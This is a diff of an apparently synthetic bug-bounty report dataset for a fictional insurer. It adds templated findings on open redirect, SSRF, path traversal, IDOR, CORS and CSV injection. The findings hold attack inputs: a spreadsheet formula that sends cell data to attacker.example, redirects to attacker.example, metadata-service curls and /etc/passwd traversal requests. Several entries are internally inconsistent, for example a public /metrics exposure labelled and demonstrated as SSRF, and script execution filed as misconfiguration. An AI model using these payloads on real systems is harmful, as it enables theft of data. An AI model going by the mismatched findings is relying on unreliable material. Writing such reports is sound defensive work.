+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15254,7 +15369,8 @@
           "offset": "2d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15402,7 +15518,8 @@
           "offset": "7d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15488,7 +15605,8 @@
           "offset": "1d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15602,7 +15720,8 @@
           "offset": "7d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15697,7 +15816,8 @@
           "offset": "2d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15841,7 +15961,8 @@
           "offset": "1d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15988,7 +16109,8 @@
           "offset": "1d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16140,7 +16262,8 @@
           "offset": "6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16260,7 +16383,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16380,7 +16504,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16560,7 +16685,8 @@
           "offset": "7d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16718,7 +16844,8 @@
           "offset": "8d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16830,7 +16957,8 @@
           "offset": "8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16932,7 +17060,8 @@
           "offset": "1d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17069,7 +17198,8 @@
           "offset": "8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17211,7 +17341,8 @@
           "offset": "4d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17368,7 +17499,8 @@
           "offset": "8d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17512,7 +17644,8 @@
           "offset": "2d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17663,7 +17796,8 @@
           "offset": "3d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17810,7 +17944,8 @@
           "offset": "4d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17968,7 +18103,8 @@
           "offset": "4d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18143,7 +18279,8 @@
           "offset": "9d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18266,7 +18403,8 @@
           "offset": "6d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18396,7 +18534,8 @@
           "offset": "1d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18539,7 +18678,8 @@
           "offset": "6d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18662,7 +18802,8 @@
           "offset": "10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18793,7 +18934,8 @@
           "offset": "9d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18920,7 +19062,8 @@
           "offset": "7d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19088,7 +19231,8 @@
           "offset": "4d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19220,7 +19364,8 @@
           "offset": "2d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19344,7 +19489,8 @@
           "offset": "3d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
